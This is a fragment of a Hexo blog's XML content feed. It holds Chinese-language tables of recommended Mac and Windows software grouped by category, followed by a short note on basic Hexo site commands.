<h2 id="u6587_u6863_u5904_u7406"><a href="#u6587_u6863_u5904_u7406" class="headerlink" title="文档处理"></a>文档处理</h2><table>
<thead>
<tr>
<th style="text-align:center">-</th>
<th>SoftwareName</th>
<th>　　Developer　　</th>
<th style="text-align:center">Mac</th>
<th style="text-align:center">Win</th>
<th style="text-align:center">Free</th>
<th>　　　　Note　　　　</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td><a href="http://endnote.com/" target="_blank" rel="external">Endnote</a></td>
<td><a href="https://en.wikipedia.org/wiki/EndNote" target="_blank" rel="external">Thomson Reuters</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td>Reference 文献管理</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td><a href="http://is.gd/SjAbs5" target="_blank" rel="external">Office 2016</a></td>
<td><a href="http://baike.baidu.com/view/2353.htm" target="_blank" rel="external">微软公司</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>Word , Excel, PowerPoint, OneNote</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td><a href="https://www.gonitro.com/" target="_blank" rel="external">Nitro PDF Pro</a></td>
<td><a href="https://en.wikipedia.org/wiki/Nitro_PDF" target="_blank" rel="external">Nitro</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>PDF编辑</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td><a href="https://www.yinxiang.com/" target="_blank" rel="external">印象笔记</a></td>
<td><a href="http://baike.baidu.com/view/8548200.htm" target="_blank" rel="external">Evernote</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center">—</td>
<td>网文搜集</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td><a href="http://www.calibre-ebook.com/" target="_blank" rel="external">Calibre</a></td>
<td><a href="http://is.gd/V4FSaf" target="_blank" rel="external">Kovid Goyal</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>电子书管理</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td><a href="http://25.io/mou/" target="_blank" rel="external">Mou</a></td>
<td><a href="http://25.io" target="_blank" rel="external">25.io Inc</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>Markdown 编辑器</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td><a href="http://sigil-ebook.com/" target="_blank" rel="external">Sigil</a></td>
<td><a href="http://is.gd/bDKF8D" target="_blank" rel="external">John Schember</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>epub 电子书制作</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td><a href="/www.xmind.net">XMind</a></td>
<td><a href="https://en.wikipedia.org/wiki/XMind" target="_blank" rel="external">XMind Ltd.</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center">x</td>
<td>思维导图制作</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td><a href="https://www.mythicsoft.com/filelocatorpro" target="_blank" rel="external">FileLocator</a></td>
<td><a href="https://www.mythicsoft.com/info/aboutus" target="_blank" rel="external">Mythicsoft Ltd.</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td>全文检索工具 支持正则表达式</td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td><a href="http://www.foxitsoftware.cn/products/reader/" target="_blank" rel="external">福昕阅读器</a></td>
<td><a href="http://www.foxitsoftware.cn/company/" target="_blank" rel="external">福昕软件</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>PDF 阅读器</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td><a href="http://www.voidtools.com/" target="_blank" rel="external">Everything</a></td>
<td><a href="http://is.gd/avswMs" target="_blank" rel="external">David Carpenter</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>文件名搜索</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td><a href="https://code.google.com/p/psp-comic-helper/" target="_blank" rel="external">PSP Comic Helper</a></td>
<td>鱼蛋</td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>漫画分割转换</td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td><a href="http://23192069.qzone.qq.com/2" target="_blank" rel="external">字幕转换助手</a></td>
<td><a href="http://user.qzone.qq.com/23192069" target="_blank" rel="external">poseidon</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td>多格式字幕互转</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td><a href="https://code.google.com/p/pdfbinder/" target="_blank" rel="external">PDFBinder</a></td>
<td></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>PDF 合并工具</td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td><a href="http://pan.baidu.com/s/1o6EJuiA" target="_blank" rel="external">MoodPad</a></td>
<td></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>追月文本处理 i254</td>
</tr>
<tr>
<td style="text-align:center">16</td>
<td><a href="http://is.gd/11CoRf" target="_blank" rel="external">拖把更名器</a></td>
<td></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>批量重命名</td>
</tr>
<tr>
<td style="text-align:center">17</td>
<td><a href="http://kuyur.info/blog/archives/1388" target="_blank" rel="external">ANSI2Unicode</a></td>
<td><a href="http://kuyur.info/blog/" target="_blank" rel="external">小熏</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>CUE 乱码修复，编码转换</td>
</tr>
<tr>
<td style="text-align:center">18</td>
<td><a href="http://is.gd/KgzGwF" target="_blank" rel="external">SrtEdit</a></td>
<td>袁卫国</td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>字幕编辑器</td>
</tr>
<tr>
<td style="text-align:center">19</td>
<td><a href="http://blog.csdn.net/redbirdli/article/category/182219" target="_blank" rel="external">Subindex</a></td>
<td>火鸟</td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>火鸟字幕合并</td>
</tr>
</tbody>
</table>
<h2 id="u7CFB_u7EDF_u5DE5_u5177"><a href="#u7CFB_u7EDF_u5DE5_u5177" class="headerlink" title="系统工具"></a>系统工具</h2><table>
<thead>
<tr>
<th style="text-align:center">-</th>
<th>SoftwareName</th>
<th>　　Developer　　</th>
<th style="text-align:center">Mac</th>
<th style="text-align:center">Win</th>
<th style="text-align:center">Free</th>
<th>　　　　Note　　　　</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td><a href="http://cn.ejie.me/" target="_blank" rel="external">Clover</a></td>
<td>易捷科技</td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>多标签资源管理器</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td><a href="http://www.listary.com/" target="_blank" rel="external">Listary</a></td>
<td>Bopsoft</td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center">x</td>
<td>资源管理器增强</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td><a href="http://www.tcbmi.com/strokeit/" target="_blank" rel="external">StrokeIt</a></td>
<td>Jeff Doozan</td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>鼠标手势</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td><a href="https://www.alfredapp.com/" target="_blank" rel="external">Alfred</a></td>
<td>Running with Crayons</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">—</td>
<td>搜索快捷键增强</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td><a href="http://www.macbartender.com/" target="_blank" rel="external">Bartender</a></td>
<td><a href="http://www.surteesstudios.com/about/" target="_blank" rel="external">Surtees Studios</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">—</td>
<td>任务栏瘦身</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td><a href="http://www.bettertouchtool.net/" target="_blank" rel="external">BetterTouchTool</a></td>
<td><a href="http://blog.boastr.net/" target="_blank" rel="external">Andreas Hegenberg</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>触控板手势</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td><a href="http://www.clipmenu.com/" target="_blank" rel="external">ClipMenu</a></td>
<td><a href="http://www.naotaka.com/" target="_blank" rel="external">Naotaka Morimoto</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">—</td>
<td>剪贴板增强</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td><a href="http://www.shauninman.com/archive/2011/10/20/day_o_mac_menu_bar_clock" target="_blank" rel="external">Day-O</a></td>
<td><a href="http://www.shauninman.com/pendium/" target="_blank" rel="external">Shaun Inman</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>菜单栏日历</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td><a href="https://pilotmoon.com/popclip/" target="_blank" rel="external">PopClip</a></td>
<td><a href="https://pilotmoon.com/" target="_blank" rel="external">Pilotmoon</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>弹出菜单 效率 鼠标</td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td><a href="http://www.totalrar.com/total-manager.html" target="_blank" rel="external">Total Manager</a></td>
<td>etinysoft</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>Finder 增强</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td><a href="https://www.trankynam.com/xtrafinder/" target="_blank" rel="external">XtraFinder</a></td>
<td><a href="https://www.trankynam.com" target="_blank" rel="external">Tran Ky Nam</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>Finder 增强</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td><a href="http://unclutterapp.com/" target="_blank" rel="external">Unclutter</a></td>
<td>Eugene Krupnov</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>临时存储，替代桌面</td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td><a href="http://www.xiazaiba.com/html/6081.html" target="_blank" rel="external">DirectX Repair</a></td>
<td></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>DLL 修复</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td><a href="https://bjango.com/mac/istatmenus/" target="_blank" rel="external">iStat Menus</a></td>
<td><a href="https://bjango.com/" target="_blank" rel="external">Bjango Pty Ltd.</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>系统与硬件监控</td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td><a href="https://www.paragon-software.com/home/ntfs-mac/" target="_blank" rel="external">NTFS for Mac</a></td>
<td><a href="https://www.paragon-software.com/about.htm" target="_blank" rel="external">Paragon Software Group</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>磁盘格式兼容</td>
</tr>
<tr>
<td style="text-align:center">16</td>
<td><a href="http://sj.ruanmei.com/" target="_blank" rel="external">软媒时间</a></td>
<td><a href="http://www.ruanmei.com/" target="_blank" rel="external">软媒</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>任务栏时间 农历 天气</td>
</tr>
<tr>
<td style="text-align:center">17</td>
<td><a href="http://www.tongyongpe.com/" target="_blank" rel="external">通用PE工具箱</a></td>
<td><a href="http://weibo.com/uepon" target="_blank" rel="external">UEPON</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>v5.0 系统安装</td>
</tr>
<tr>
<td style="text-align:center">18</td>
<td><a href="https://itunes.apple.com/us/app/blackmagic-disk-speed-test/id425264550?mt=12" target="_blank" rel="external">Disk Speed Test</a></td>
<td><a href="https://www.blackmagicdesign.com/" target="_blank" rel="external">Blackmagic Design Inc</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>硬盘测速</td>
</tr>
<tr>
<td style="text-align:center">19</td>
<td><a href="http://www.foldersizes.com/" target="_blank" rel="external">FolderSizes</a></td>
<td><a href="http://www.keymetricsoft.com/" target="_blank" rel="external">Key Metric Software</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center">x</td>
<td>文件夹、文件空间占用分析</td>
</tr>
<tr>
<td style="text-align:center">20</td>
<td><a href="https://www.piriform.com/recuva" target="_blank" rel="external">Recuva</a></td>
<td><a href="https://www.piriform.com/about" target="_blank" rel="external">Piriform</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center">x</td>
<td>数据恢复</td>
</tr>
<tr>
<td style="text-align:center">21</td>
<td><a href="http://www.goodsync.com/" target="_blank" rel="external">GoodSync</a></td>
<td>Siber Systems Inc.</td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center">x</td>
<td>本地文件同步</td>
</tr>
<tr>
<td style="text-align:center">22</td>
<td><a href="http://www.mediaatelier.com/CheatSheet/" target="_blank" rel="external">CheatSheet</a></td>
<td></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>快捷键显示</td>
</tr>
</tbody>
</table>
<h2 id="u5F71_u97F3_u56FE_u50CF"><a href="#u5F71_u97F3_u56FE_u50CF" class="headerlink" title="影音图像"></a>影音图像</h2><table>
<thead>
<tr>
<th style="text-align:center">-</th>
<th>SoftwareName</th>
<th>　　Developer　　</th>
<th style="text-align:center">Mac</th>
<th style="text-align:center">Win</th>
<th style="text-align:center">Free</th>
<th>　　　　Note　　　　</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td><a href="http://www.babelsoft.net/products.htm" target="_blank" rel="external">Media Preview</a></td>
<td><a href="http://www.babelsoft.net/" target="_blank" rel="external">博语软件</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>资源管理器 视频缩略图</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td><a href="http://www.enfis.it/cue-splitter-tutorial/" target="_blank" rel="external">CUE Splitter</a></td>
<td><a href="http://www.medieval.it/" target="_blank" rel="external">Medieval Software</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>无损音乐分割</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td><a href="http://www.mp3tag.de/en/" target="_blank" rel="external">Mp3tag</a></td>
<td>Florian Heidenreich</td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>MP3标签修改 去乱码</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td><a href="https://en.wikipedia.org/wiki/PotPlayer" target="_blank" rel="external">PotPlayer</a></td>
<td><a href="https://en.wikipedia.org/wiki/Kakao" target="_blank" rel="external">Daum Communications</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>视频播放</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td><a href="http://pic.2345.com/" target="_blank" rel="external">2345看图王</a></td>
<td><a href="/2345.com">2345.com</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>图片浏览</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td><a href="http://www.pc6.com/softview/SoftView_77375.html" target="_blank" rel="external">魔方图标大师</a></td>
<td><a href="http://www.ruanmei.com/" target="_blank" rel="external">软媒</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>图标处理</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td><a href="http://www.crsky.com/soft/28076.html" target="_blank" rel="external">全能音频转换通</a></td>
<td></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>v1.2</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td><a href="https://en.wikipedia.org/wiki/Adobe_Photoshop" target="_blank" rel="external">Adobe Photoshop</a></td>
<td><a href="https://en.wikipedia.org/wiki/Adobe_Systems" target="_blank" rel="external">Adobe Systems</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center">x</td>
<td>图像处理</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td><a href="http://www.arcsoft.com/photoplus/" target="_blank" rel="external">ArcSoft Photo+</a></td>
<td><a href="https://en.wikipedia.org/wiki/ArcSoft" target="_blank" rel="external">ArcSoft</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>图片浏览</td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td><a href="https://en.wikipedia.org/wiki/Inpaint" target="_blank" rel="external">Inpaint</a></td>
<td><a href="http://www.theinpaint.com/" target="_blank" rel="external">Maxim Gapchenko</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center">x</td>
<td>抠图，去背景</td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td><a href="https://en.wikipedia.org/wiki/ScreenFlow" target="_blank" rel="external">ScreenFlow</a></td>
<td><a href="http://www.telestream.net/company/overview.htm" target="_blank" rel="external">Telestream, Inc.</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>屏幕录制</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td><a href="http://www.faststone.org/FSCaptureDetail.htm" target="_blank" rel="external">FastStone Capture</a></td>
<td><a href="http://www.faststone.org/" target="_blank" rel="external">FastStone Soft</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center">x</td>
<td>截图</td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td><a href="http://baike.baidu.com/view/2343158.htm" target="_blank" rel="external">SplitIt</a></td>
<td><a href="http://user.qzone.qq.com/23192069" target="_blank" rel="external">poseidon</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td>影音剪切合并</td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td><a href="http://xee.c3.cx/" target="_blank" rel="external">Xee</a></td>
<td><a href="http://wakaba.c3.cx/s/" target="_blank" rel="external">Dag Ågren</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>图片浏览</td>
</tr>
<tr>
<td style="text-align:center">15</td>
<td><a href="http://www.shuimiao.net/info.asp?id=157" target="_blank" rel="external">GIF动画录制精灵</a></td>
<td><a href="http://www.shuimiao.net/" target="_blank" rel="external">水淼软件</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">16</td>
<td><a href="http://baike.baidu.com/view/647184.htm" target="_blank" rel="external">MangaMeeya</a></td>
<td>Manga Underground</td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>漫画阅读</td>
</tr>
<tr>
<td style="text-align:center">17</td>
<td><a href="http://www.benvista.com/photozoompro" target="_blank" rel="external">PhotoZoom</a></td>
<td><a href="http://www.benvista.com/aboutus" target="_blank" rel="external">BenVista Ltd.</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center">x</td>
<td>图片无损缩放</td>
</tr>
<tr>
<td style="text-align:center">18</td>
<td><a href="http://www.snip.qq.com/" target="_blank" rel="external">Snip</a></td>
<td><a href="http://baike.baidu.com/view/1591.htm" target="_blank" rel="external">腾讯</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>截图</td>
</tr>
<tr>
<td style="text-align:center">19</td>
<td><a href="https://itunes.apple.com/us/app/covered/id860548294?mt=12" target="_blank" rel="external">Covered</a></td>
<td><a href="http://robheague.com/" target="_blank" rel="external">Rob Heague</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>专辑封面下载</td>
</tr>
<tr>
<td style="text-align:center">20</td>
<td><a href="http://mediacoder.com.cn/" target="_blank" rel="external">MediaCoder</a></td>
<td>Stanley Huang</td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>音视频转码</td>
</tr>
<tr>
<td style="text-align:center">21</td>
<td><a href="https://www.bunkus.org/videotools/mkvtoolnix/" target="_blank" rel="external">MKVToolnix</a></td>
<td><a href="https://www.bunkus.org/blog/" target="_blank" rel="external">Moritz Bunkus</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>视频音频字幕处理</td>
</tr>
<tr>
<td style="text-align:center">22</td>
<td><a href="https://itunes.apple.com/app/id940107333" target="_blank" rel="external">iSmartPhoto</a></td>
<td>Chi Lin</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>图片管理</td>
</tr>
<tr>
<td style="text-align:center">23</td>
<td><a href="http://www.collageitfree.com/" target="_blank" rel="external">CollageIt</a></td>
<td>PearlMountain</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>拼图</td>
</tr>
<tr>
<td style="text-align:center">24</td>
<td><a href="https://itunes.apple.com/cn/app/bao-feng-ying-yin/id1035547244?mt=12" target="_blank" rel="external">暴风影音</a></td>
<td><a href="http://www.baofeng.com/" target="_blank" rel="external">暴风科技</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>Mac 版很简洁</td>
</tr>
<tr>
<td style="text-align:center">25</td>
<td><a href="http://mplayerx.org/" target="_blank" rel="external">MPlayerX</a></td>
<td><a href="http://blog.mplayerx.org/" target="_blank" rel="external">Zongyao Qu</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>视频播放</td>
</tr>
</tbody>
</table>
<h2 id="u5E94_u7528_u8F6F_u4EF6"><a href="#u5E94_u7528_u8F6F_u4EF6" class="headerlink" title="应用软件"></a>应用软件</h2><table>
<thead>
<tr>
<th style="text-align:center">-</th>
<th>SoftwareName</th>
<th>　　Developer　　</th>
<th style="text-align:center">Mac</th>
<th style="text-align:center">Win</th>
<th style="text-align:center">Free</th>
<th>　　　　Note　　　　</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td><a href="http://www.betterzip.com/" target="_blank" rel="external">BetterZip</a></td>
<td><a href="http://macitbetter.com/" target="_blank" rel="external">MacItBetter</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>解压缩</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td><a href="http://haozip.2345.com/" target="_blank" rel="external">2345好压</a></td>
<td><a href="/2345.com">2345.com</a></td>
<td style="text-align:center">—</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>解压缩</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td><a href="http://us.blackberry.com/software/desktop/blackberry-blend.html" target="_blank" rel="external">BlackBerry Blend</a></td>
<td><a href="http://us.blackberry.com/" target="_blank" rel="external">BlackBerry</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>黑莓文件管理</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td><a href="http://www.noiz.io/" target="_blank" rel="external">Noizio</a></td>
<td>noiz.io</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center"></td>
<td>白噪音 声效</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td><a href="https://www.omnigroup.com/omnifocus/" target="_blank" rel="external">OmniFocus</a></td>
<td><a href="https://en.wikipedia.org/wiki/The_Omni_Group" target="_blank" rel="external">The Omni Group</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>GTD、任务管理</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td><a href="http://www.parallelsdesktop.cn/" target="_blank" rel="external">Parallels Desktop</a></td>
<td><a href="http://www.dwz.cn/27tepC" target="_blank" rel="external">Parallels</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td style="text-align:center">x</td>
<td>虚拟机</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td><a href="https://www.rescuetime.com" target="_blank" rel="external">RescueTime</a></td>
<td></td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center">—</td>
<td>时间流水记录</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td><a href="https://github.com/xsacha/Sachesi" target="_blank" rel="external">Sachesi</a></td>
<td><a href="https://github.com/xsacha" target="_blank" rel="external">xsacha</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td>黑莓刷机</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td><a href="http://pinyin.sogou.com/" target="_blank" rel="external">搜狗输入法</a></td>
<td><a href="http://corp.sogou.com/" target="_blank" rel="external">搜狗</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">10</td>
<td><a href="http://www.yibei.com/software" target="_blank" rel="external">易呗背单词</a></td>
<td><a href="http://www.yibei.com/" target="_blank" rel="external">易呗</a></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">11</td>
<td><a href="http://www.443w.com/tts/" target="_blank" rel="external">朗读女</a></td>
<td><a href="http://www.443w.com/" target="_blank" rel="external">阿嘉</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>语音朗读</td>
</tr>
<tr>
<td style="text-align:center">12</td>
<td><a href="http://www.tongbusj.com/" target="_blank" rel="external">同步助手</a></td>
<td>宇通博软件</td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>iOS 设备管理</td>
</tr>
<tr>
<td style="text-align:center">13</td>
<td><a href="http://dict.youdao.com/" target="_blank" rel="external">有道词典</a></td>
<td><a href="http://baike.baidu.com/view/149363.htm" target="_blank" rel="external">网易公司</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">14</td>
<td><a href="http://ankisrs.net/" target="_blank" rel="external">Anki</a></td>
<td><a href="http://ichi2.net/" target="_blank" rel="external">Damien Elmes</a></td>
<td style="text-align:center"></td>
<td style="text-align:center">√</td>
<td style="text-align:center"></td>
<td>卡片辅助记忆</td>
</tr>
</tbody>
</table>
]]></content>
      
        <categories>
            
            <category> 杂碎 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Mac </tag>
            
            <tag> Software </tag>
            
            <tag> Windows </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[hexo编写笔记]]></title>
      <url>https://nanshihui.github.io/2016/01/07/hello-world/</url>
      <content type="html"><![CDATA[<p>简单的记录hexo的指令.</p>
<h2 id="u65B0_u624B_u5165_u95E8"><a href="#u65B0_u624B_u5165_u95E8" class="headerlink" title="新手入门"></a>新手入门</h2><h3 id="u65B0_u5EFA_u6587_u7AE0"><a href="#u65B0_u5EFA_u6587_u7AE0" class="headerlink" title="新建文章"></a>新建文章</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>更多信息: <a href="http://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="u8FD0_u884C_u670D_u52A1_u5668"><a href="#u8FD0_u884C_u670D_u52A1_u5668" class="headerlink" title="运行服务器"></a>运行服务器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>更多信息: <a href="http://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="u751F_u6210_u9759_u6001_u6587_u4EF6"><a href="#u751F_u6210_u9759_u6001_u6587_u4EF6" class="headerlink" title="生成静态文件"></a>生成静态文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>更多信息: <a href="http://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="u90E8_u7F72_u670D_u52A1"><a href="#u90E8_u7F72_u670D_u52A1" class="headerlink" title="部署服务"></a>部署服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
